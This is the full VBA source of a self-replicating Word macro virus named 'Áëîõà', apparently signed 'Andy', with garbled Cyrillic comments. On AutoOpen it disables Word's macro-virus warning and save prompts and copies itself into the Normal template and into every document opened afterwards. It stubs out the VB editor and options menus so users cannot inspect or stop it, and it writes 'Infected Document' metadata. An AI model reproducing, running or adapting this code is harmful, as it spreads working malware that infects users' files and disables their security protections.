   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Áëîõà"
   'Sub Crypt()
   '    Dim M$(2)
   '    A$ = "Auto"
   '    O$ = "Open"
   '    M$(0) = A$ + O$
   'End Sub
   Sub AutoOpen()
   'Sub AO()
       'Result = MsgBox("Áëîõà", vbOKOnly)
       Call BigBloha
   End Sub

   Sub ViewVBCode() ' Òåïåðü ðåäàêòîð VB ïåðåñòàíåò çàïóñêàòüñÿ ;)))
       'Dialogs(wdDialogToolsMacro).Show '.Display
   End Sub

   Sub ToolsOptions() ' Òåïåðü þçåð íå ñìîæåò ïîìåíÿòü íàñòðîéêè ðåäàêòîðà ;)))
   End Sub

   Sub BigBloha()

       ' Îòêëþ÷àåì ðàçëè÷íûå ïðåäóïðåäèòåëüíûå ñîîáùåíèÿ, èçìåíÿÿ óñòàíîâêè ðåäàêòîðà Word
       With Options
           .ConfirmConversions = False ' True if Word displays the "Convert File" dialog box before it opens or inserts a file that isn't a Word document or template.
           .VirusProtection = False    ' True if Word displays a built-in warning message whenever you open a document or template that might contain macro viruses.
           .SaveNormalPrompt = False   ' True if Word prompts the user for confirmation to save changes to the Normal template before it quits.
       End With

       On Error Resume Next ' Âêëþ÷àåì âíóòðåííèþ îáðàáîòêó îøèáîê
       ' âîçíèêíîâåíèå îøèáêè âûïîëíåíèÿ ïðèâîäèò ê ïåðåäà÷å óïðàâëåíèÿ íà èíñòðóêöèþ, íåïîñðåäñòâåííî ñëåäóþùóþ çà èíñòðóêöèåé, ïðè âûïîëíåíèè êîòîðîé âîçíèêëà îøèáêà.


       Set cntnr = MacroContainer
       motherName = UCase(cntnr.Name) ' Èìÿ äîê-òà, èç êîòîðîãî çàïóùåí ìàêðîñ
       experemental = UCase(MacroContainer.Name)

       targetName = UCase(ActiveDocument.Name) ' Èìÿ àêòèâíîãî â äàííûé ìîìåíò äîê-òà

       ' Íàõîäèì ïîëíîå èìÿ öåëè:
       If motherName = targetName Then ' => Ìû çàïóùåíû èç ëåâîãî äîê-òà
           TargetFullName = NormalTemplate.FullName ' öåëü: Íîðìàëüíûé øàáëîí
           MotherFullName = ActiveDocument.FullName ' èñòî÷íèê: Àêòèâíûé äîê-ò
           'Êîïèðóåì ñåáÿ (âåñü ôàéë öåëèêîì)â äèðåêòîðèþ ñ normal.dot:
           ActiveDocument.SaveAs FileName:=NormalTemplate.Path + "\template.doc" ', FileFormat:=wdFormatText, WritePassword:="pass" '2 ñïîñîá CopyFile
           ActiveDocument.SaveAs FileName:=MotherFullName 'Âîññòàíàâëèâàåì èìÿ ôàéëà
           f0 = 0
       Else                            ' => Ìû çàïóùåíû èç øàáëîíà (normal.dot íàâåðíÿêà)
           TargetFullName = ActiveDocument.FullName ' öåëü: Àêòèâíûé äîê-ò
           'MotherFullName = NormalTemplate.FullName ' èñòî÷íèê
           MotherFullName = NormalTemplate.Path + "\template.doc"
           f0 = 1
       End If

   '******************************************************************************
   '******************************************************************************
       'Êîïèðóåì  ìàêðîñ (Object:=wdOrganizerObjectProjectItems) â äîêóìåíò Destination:=two$ èç äîê-òà Source:=one$
       Application.OrganizerCopy _
             Source:=MotherFullName, _
             Destination:=TargetFullName, _
             Name:="Áëîõà", _
             Object:=wdOrganizerObjectProjectItems    'ïðèçíàê òîãî, ÷òî áóäåì êîïèðîâàòü ìàêðîñ
   '******************************************************************************
   '******************************************************************************

       'Ñîõðàíÿåì èçìåíåíèÿ â æåðòâå:
       'If f0 = 0 Then NormalTemplate.Save Else ActiveDocument.Save
       If f0 = 1 Then ActiveDocument.Save


   '******* Çàïîëíÿåì èíôó î òåêóùåì äîê-òå (àâòîð,òåìà,çàìåòêè è ò.ä)
       With Dialogs(wdDialogFileSummaryInfo) ' Ïîäãîòàâëèâàåì ñòàíäàðòíóþ äèàëîãîâóþ ôîðìó wdDialogFileSummaryInfo
           .Author = "Andy"
           .Title = "Infected Document"
           .Subject = "Macro Virus Infection by Andy"
           .Comments = "Hello from Andy !"
           .Execute 'Âêëþ÷àåì âñå ýòè óñòàíîâêè ;)
       End With
   '*******

   '******* Çàùèùàåì òåêóùèé äîê-ò îò þçåðà ;)
   With ActiveDocument
       ''.ReadOnlyRecommended = False ' Ðàçðåøàåì èçìåíåíèÿ ýòîãî (àêòèâíîãî) äîê-òà
       ''.Password = ""               'è ñòàâèì ïàðîëü íà îòêðûòèå äîê-òà
       ''.WritePassword = ""          ' Ïàðîëü îò ñîõðàíåíèÿ èçìåíåíèé â äîê-òå
   End With
   '*******


   On Error GoTo -1: On Error GoTo 0 ' Îòêëþ÷åíèå îáðàáîòêè îøèáêè


   End Sub
